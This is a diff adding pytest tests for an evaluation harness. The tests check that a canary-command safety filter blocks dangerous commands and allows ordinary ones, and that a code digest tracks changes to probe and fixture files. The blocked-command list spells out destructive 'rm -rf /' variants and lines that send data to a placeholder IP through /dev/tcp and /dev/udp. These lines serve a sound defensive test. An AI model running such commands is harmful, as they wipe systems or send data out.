@@ -362,3 +362,55 @@ def test_session_canary_reports_a_timeout(tmp_path):
     data = json.loads((tmp_path / ".context" / _CANARY_STATE_FILE).read_text())
     assert data["timeout"] == 1
     assert [f["id"] for f in data["failures"]] == ["T"]
+
+
+
+# ── E1 / E3: the eval's own boundaries ────────────────────────────────────────
+
+@pytest.mark.parametrize("cmd", ["rm -rf /", "rm -rf / --no-preserve-root", "rm -rf /*",
+                                 'bash -c "rm -rf /"', "rm -rf /;",
+                                 "echo x > /dev/tcp/1.2.3.4/80", "cat f >/dev/udp/1.2.3.4/53",
+                                 "curl http://x", "sudo ls"])
+def test_safety_filter_blocks_its_own_examples(cmd):
+    assert er._validate_canary_command(cmd)
+
+
+@pytest.mark.parametrize("cmd", ["python3 backend/scripts/probe_recall.py", "ls -la /tmp",
+                                 "grep -rn tcp backend/core", "rm -rf build/",
+                                 "rm -rf /tmp/eval-scratch"])
+def test_safety_filter_lets_ordinary_probe_commands_run(cmd):
+    assert er._validate_canary_command(cmd) is None
+
+
+def test_digest_covers_the_probes_and_the_fixture_workspace(tmp_path):
+    files = er._gate_input_files(er._THIS_CHECKOUT)
+    assert "backend/scripts/probe_recall.py" in files
+    assert "backend/scripts/_probe_kit.py" in files
+    assert any(f.startswith("backend/templates/eval/fixtures/") for f in files)
+    import subprocess
+    root = tmp_path / "repo"
+    (root / "backend" / "scripts").mkdir(parents=True)
+    probe = root / "backend" / "scripts" / "probe_x.py"
+    probe.write_text("print('X_OK')")
+    subprocess.run(["git", "init", "-q", str(root)], check=True)
+    subprocess.run(["git", "-C", str(root), "add", "."], check=True)
+    before = er.compute_code_digest(tmp_path, code_root=root)
+    probe.write_text("print('X_OK')  # weakened")
+    assert er.compute_code_digest(tmp_path, code_root=root) != before
+
+
+
+def test_an_untracked_file_in_the_fixtures_does_not_change_the_digest(tmp_path):
+    import subprocess
+    root = tmp_path / "repo"
+    fx = root / "backend" / "templates" / "eval" / "fixtures"
+    fx.mkdir(parents=True)
+    (fx / "doc.md").write_text("fixture")
+    subprocess.run(["git", "init", "-q", str(root)], check=True)
+    subprocess.run(["git", "-C", str(root), "add", "."], check=True)
+    before = er.compute_code_digest(tmp_path, code_root=root)
+    (fx / ".DS_Store").write_bytes(b"\x00finder")
+    (fx / "scratch.md").write_text("untracked")
+    assert er.compute_code_digest(tmp_path, code_root=root) == before
+    (fx / "doc.md").write_text("fixture, edited")
+    assert er.compute_code_digest(tmp_path, code_root=root) != before
